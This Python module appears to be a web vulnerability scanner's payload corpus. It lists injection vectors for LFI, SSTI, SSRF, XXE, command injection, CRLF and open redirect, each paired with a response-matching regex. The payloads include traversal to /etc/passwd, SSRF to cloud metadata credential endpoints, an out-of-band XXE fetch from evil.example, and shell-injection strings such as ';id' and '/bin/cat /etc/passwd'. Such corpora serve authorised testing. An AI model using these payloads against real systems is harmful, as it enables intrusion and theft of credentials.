"""
Non-SQLi injection corpora: LFI/RFI, SSTI, XXE, SSRF, path traversal, CRLF, command injection.
"""

from __future__ import annotations

from typing import Any

LFI = [
    {"id": "LFI01", "vector": "../../../../../../etc/passwd", "os": "linux", "signal": r"root:.*:0:0:"},
    {"id": "LFI02", "vector": "....//....//....//....//etc/passwd", "os": "linux", "signal": r"root:.*:0:0:"},
    {"id": "LFI03", "vector": "..%2f..%2f..%2f..%2fetc%2fpasswd", "os": "linux", "signal": r"root:.*:0:0:"},
    {"id": "LFI04", "vector": "..%252f..%252f..%252fetc%252fpasswd", "os": "linux", "signal": r"root:.*:0:0:"},
    {"id": "LFI05", "vector": "/etc/passwd", "os": "linux", "signal": r"root:.*:0:0:"},
    {"id": "LFI06", "vector": "....\\\\....\\\\....\\\\windows\\\\win.ini", "os": "windows", "signal": r"\[fonts\]"},
    {"id": "LFI07", "vector": "..\\..\\..\\..\\windows\\win.ini", "os": "windows", "signal": r"\[fonts\]"},
    {"id": "LFI08", "vector": "C:\\Windows\\win.ini", "os": "windows", "signal": r"\[fonts\]"},
    {"id": "LFI09", "vector": "php://filter/convert.base64-encode/resource=index.php", "os": "php", "signal": r"[A-Za-z0-9+/]{40,}={0,2}"},
    {"id": "LFI10", "vector": "php://filter/read=string.rot13/resource=index.php", "os": "php", "signal": r".{20,}"},
    {"id": "LFI11", "vector": "expect://id", "os": "php", "signal": r"uid="},
    {"id": "LFI12", "vector": "file:///etc/passwd", "os": "linux", "signal": r"root:.*:0:0:"},
    {"id": "LFI13", "vector": "/proc/self/environ", "os": "linux", "signal": r"(PATH=|USER=|HOME=)"},
    {"id": "LFI14", "vector": "....//....//....//....//etc/hosts", "os": "linux", "signal": r"localhost"},
    {"id": "LFI15", "vector": "....//....//....//....//etc/issue", "os": "linux", "signal": r"(Ubuntu|Debian|Linux|Red Hat)"},
]

SSTI = [
    {"id": "SSTI01", "vector": "{{7*7}}", "engine": "jinja/twig", "signal": r"(?<!\d)49(?!\d)"},
    {"id": "SSTI02", "vector": "${7*7}", "engine": "freemarker/java", "signal": r"(?<!\d)49(?!\d)"},
    {"id": "SSTI03", "vector": "<%= 7*7 %>", "engine": "erb", "signal": r"(?<!\d)49(?!\d)"},
    {"id": "SSTI04", "vector": "#{7*7}", "engine": "ruby", "signal": r"(?<!\d)49(?!\d)"},
    {"id": "SSTI05", "vector": "*{7*7}", "engine": "thymeleaf", "signal": r"(?<!\d)49(?!\d)"},
    {"id": "SSTI06", "vector": "{{7*'7'}}", "engine": "jinja2", "signal": r"7777777"},
    {"id": "SSTI07", "vector": "{{config}}", "engine": "jinja2", "signal": r"(SECRET|Config|SETTINGS)"},
    {"id": "SSTI08", "vector": "{{self}}", "engine": "jinja2", "signal": r"(object|SSTI|Template)"},
    {"id": "SSTI09", "vector": "${T(java.lang.System).getenv()}", "engine": "spel", "signal": r"(PATH|JAVA_HOME)"},
    {"id": "SSTI10", "vector": "{{''.__class__.__mro__[1].__subclasses__()}}", "engine": "jinja2", "signal": r"subclass|escape|module"},
]

SSRF = [
    {"id": "SSRF01", "vector": "http://127.0.0.1/", "target": "loopback"},
    {"id": "SSRF02", "vector": "http://localhost/", "target": "loopback"},
    {"id": "SSRF03", "vector": "http://[::1]/", "target": "loopback6"},
    {"id": "SSRF04", "vector": "http://169.254.169.254/latest/meta-data/", "target": "aws-imds"},
    {"id": "SSRF05", "vector": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "target": "aws-iam"},
    {"id": "SSRF06", "vector": "http://metadata.google.internal/computeMetadata/v1/", "target": "gcp"},
    {"id": "SSRF07", "vector": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "target": "azure"},
    {"id": "SSRF08", "vector": "http://0.0.0.0/", "target": "zero"},
    {"id": "SSRF09", "vector": "http://2130706433/", "target": "decimal-loopback"},  # 127.0.0.1
    {"id": "SSRF10", "vector": "http://0x7f000001/", "target": "hex-loopback"},
    {"id": "SSRF11", "vector": "http://127.1/", "target": "short-loopback"},
    {"id": "SSRF12", "vector": "file:///etc/passwd", "target": "file"},
    {"id": "SSRF13", "vector": "gopher://127.0.0.1:6379/_INFO", "target": "gopher-redis"},
    {"id": "SSRF14", "vector": "dict://127.0.0.1:11211/stats", "target": "dict-memcached"},
    {"id": "SSRF15", "vector": "http://localtest.me/", "target": "dns-rebind-like"},
]

XXE = [
    {"id": "XXE01", "vector": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "type": "file"},
    {"id": "XXE02", "vector": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>', "type": "ssrf"},
    {"id": "XXE03", "vector": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/xxe.dtd">%xxe;]><foo/>', "type": "oob"},
    {"id": "XXE04", "vector": '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>', "type": "windows"},
    {"id": "XXE05", "vector": '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % dtd SYSTEM "file:///etc/passwd"> %dtd;]><a/>', "type": "param-entity"},
]

CMDI = [
    {"id": "CMD01", "vector": ";id", "signal": r"uid="},
    {"id": "CMD02", "vector": "|id", "signal": r"uid="},
    {"id": "CMD03", "vector": "`id`", "signal": r"uid="},
    {"id": "CMD04", "vector": "$(id)", "signal": r"uid="},
    {"id": "CMD05", "vector": "& whoami", "signal": r"(root|www-data|admin|Administrator)"},
    {"id": "CMD06", "vector": "&& id", "signal": r"uid="},
    {"id": "CMD07", "vector": "|| id", "signal": r"uid="},
    {"id": "CMD08", "vector": "\n/bin/cat /etc/passwd", "signal": r"root:.*:0:0:"},
    {"id": "CMD09", "vector": "; ping -c 1 127.0.0.1", "signal": r"ttl=", "time": True},
    {"id": "CMD10", "vector": "| dir", "signal": r"(Directory of|Volume Serial)", "os": "windows"},
]

CRLF = [
    {"id": "CRLF01", "vector": "%0d%0aSet-Cookie:psec=1", "signal": "set-cookie"},
    {"id": "CRLF02", "vector": "%0d%0aX-Injected: true", "signal": "x-injected"},
    {"id": "CRLF03", "vector": "\\r\\nSet-Cookie: psec=1", "signal": "set-cookie"},
]

OPEN_REDIRECT = [
    "https://evil.example/",
    "//evil.example/",
    "/\\evil.example/",
    "https:evil.example",
    "////evil.example",
    "https://evil.example%2f%2f.good.com/",
    "///evil.example",
    "\\/\\/evil.example/",
]


def list_payloads(family: str = "all") -> dict[str, Any]:
    fam = (family or "all").lower()
    data = {
        "lfi": LFI,
        "ssti": SSTI,
        "ssrf": SSRF,
        "xxe": XXE,
        "cmdi": CMDI,
        "crlf": CRLF,
        "open_redirect": [{"id": f"OR{i:02d}", "vector": v} for i, v in enumerate(OPEN_REDIRECT, 1)],
    }
    if fam == "all":
        return {k: {"count": len(v), "payloads": v} for k, v in data.items()} | {
            "families": list(data.keys()),
            "total": sum(len(v) for v in data.values()),
        }
    if fam not in data:
        raise ValueError(f"unknown family {fam}. choose: {list(data)}")
    return {"family": fam, "count": len(data[fam]), "payloads": data[fam]}
